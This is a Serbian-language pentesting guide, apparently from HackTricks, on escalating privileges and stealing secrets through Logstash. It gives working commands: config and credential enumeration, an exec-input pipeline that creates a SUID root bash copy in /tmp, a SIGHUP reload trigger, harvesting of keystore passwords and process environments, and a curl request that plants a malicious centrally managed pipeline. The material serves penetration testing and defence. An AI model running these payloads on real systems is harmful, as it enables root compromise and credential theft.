# Logstash Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se koristi za **prikupljanje, transformaciju i prosleđivanje logova** kroz sistem poznat kao **pipelines**. Ovi pipelines se sastoje od **input**, **filter**, i **output** faza. Zanimljiv aspekt se javlja kada Logstash radi na kompromitovanom računaru.

### Pipeline Configuration

Pipelines su konfigurisani u fajlu **/etc/logstash/pipelines.yml**, koji navodi lokacije konfiguracija pipelines-a:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ovaj fajl otkriva gde se nalaze **.conf** fajlovi koji sadrže konfiguracije **pipelines**. Kada se koristi **Elasticsearch output module**, često **pipelines** uključuju **Elasticsearch credentials** koje imaju velike privilegije zbog toga što Logstash mora da upisuje podatke u Elasticsearch. Wildcards u putanjama konfiguracije omogućavaju Logstash-u da izvrši sve odgovarajuće **pipelines** u naznačenom direktorijumu.

Ako se Logstash pokrene sa `-f <directory>` umesto sa `pipelines.yml`, **svi fajlovi unutar tog direktorijuma se konkateniraju u leksikografskom redu i parsiraju kao jedna konfiguracija**. To stvara 2 napadačke implikacije:

- Ubacen fajl kao `000-input.conf` ili `zzz-output.conf` može promeniti kako se konačni **pipeline** sklopi
- Neispravan fajl može sprečiti učitavanje celog **pipeline**-a, zato pažljivo validirajte payload-e pre nego što se oslonite na auto-reload

### Brza enumeracija na kompromitovanom hostu

Na mašini gde je Logstash instaliran, brzo proverite:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Takođe proverite da li je lokalni monitoring API dostupan. Podrazumevano se vezuje na **127.0.0.1:9600**, što je obično dovoljno nakon što se nađete na hostu:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Ovo obično daje ID-e pipeline-ova, detalje o runtime-u i potvrdu da je vaš izmenjeni pipeline učitan.

Kredencijali dobijeni iz Logstash-a obično otključavaju **Elasticsearch**, pa pogledajte [ovu drugu stranicu o Elasticsearch-u](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Eskalacija privilegija putem pipeline-ova sa pristupom za pisanje

Da biste pokušali eskalaciju privilegija, prvo identifikujte korisnika pod kojim radi Logstash servis, obično korisnika **logstash**. Uverite se da ispunjavate **jedan** od sledećih kriterijuma:

- Imate **pristup za pisanje** nad .conf fajlom pipeline-a **ili**
- Fajl **/etc/logstash/pipelines.yml** koristi wildcard, i možete pisati u ciljnom folderu

Pored toga, **jedan** od sledećih uslova mora biti ispunjen:

- Mogućnost restartovanja Logstash servisa **ili**
- Fajl **/etc/logstash/logstash.yml** ima postavljeno **config.reload.automatic: true**

Ako konfiguracija sadrži wildcard, kreiranje fajla koji odgovara tom wildcard-u omogućava izvršavanje komandi. Na primer:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Ovde, **interval** određuje učestalost izvršavanja u sekundama. U datom primeru, komanda **whoami** se izvršava na svakih 120 sekundi, a njen izlaz se usmerava u **/tmp/output.log**.

Sa **config.reload.automatic: true** u **/etc/logstash/logstash.yml**, Logstash će automatski otkriti i primeniti nove ili izmenjene pipeline konfiguracije bez potrebe za restartom. Ako nema wildcard-a, izmene se i dalje mogu napraviti u postojećim konfiguracijama, ali se savetuje oprez kako bi se izbegle smetnje.

### Pouzdaniji Pipeline Payloads

The `exec` input plugin i dalje radi u trenutnim izdanjima i zahteva ili `interval` ili `schedule`. On se izvršava kroz **forking** Logstash JVM-a, tako da ako je memorija ograničena vaš payload može da zakaže sa `ENOMEM` umesto da se izvrši tiho.

Praktičniji privilege-escalation payload je obično onaj koji ostavlja trajan artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Ako nemate prava za restart, ali možete poslati signal procesu, Logstash takođe podržava ponovno učitavanje inicirano **SIGHUP** signalom na sistemima sličnim Unixu:
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Imajte na umu da nije svaki plugin kompatibilan sa ponovnim učitavanjem. Na primer, **stdin** input sprečava automatsko ponovno učitavanje, pa ne pretpostavljajte da će `config.reload.automatic` uvek uočiti vaše izmene.

### Stealing Secrets from Logstash

Pre nego što se fokusirate isključivo na izvršavanje koda, prikupite podatke do kojih Logstash već ima pristup:

- Kredencijali u plaintextu često su hardkodirani unutar `elasticsearch {}` outputs, `http_poller`, JDBC inputs, ili podešavanja vezana za cloud
- Secure settings mogu biti smeštena u **`/etc/logstash/logstash.keystore`** ili nekom drugom `path.settings` direktorijumu
- Lozinka keystore-a se često obezbeđuje putem **`LOGSTASH_KEYSTORE_PASS`**, a instalacije iz paketa obično je preuzimaju iz **`/etc/sysconfig/logstash`**
- Ekspanzija promenljivih okruženja sa `${VAR}` rešava se pri pokretanju Logstash-a, pa vredi pregledati okruženje servisa

Korisne provere:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Ovo takođe vredi proveriti zato što je **CVE-2023-46672** pokazao da Logstash može zabeležiti osetljive informacije u logovima u određenim okolnostima. Na hostu nakon post-eksploatacije, stare Logstash logove i `journald` unose stoga mogu otkriti podatke za prijavu čak i ako trenutna konfiguracija referencira `keystore` umesto da čuva tajne inline.

### Zloupotreba centralizovanog upravljanja pipeline-ovima

U nekim okruženjima, host uopšte ne zavisi od lokalnih `.conf` fajlova. Ako je podešeno **`xpack.management.enabled: true`**, Logstash može povući centralno upravljane pipelines iz Elasticsearch/Kibana, i nakon omogućavanja ovog moda lokalne pipeline konfiguracije više nisu izvor istine.

To znači drugačiji vektor napada:

1. Povratite Elastic podatke za prijavu iz lokalnih Logstash podešavanja, keystore-a ili logova
2. Proverite da li nalog ima **`manage_logstash_pipelines`** privilegiju klastera
3. Kreirajte ili zamenite centralno upravljani pipeline tako da Logstash host izvrši vaš payload pri narednom intervalu provere

The Elasticsearch API used for this feature is:
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Ovo je naročito korisno kada su lokalne datoteke samo za čitanje, ali je Logstash već registrovan da udaljeno preuzima pipelines.

## Izvori

- [Elastic Docs: Reloading the Config File](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [Elastic Docs: Configure Centralized Pipeline Management](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)

{{#include ../../banners/hacktricks-training.md}}
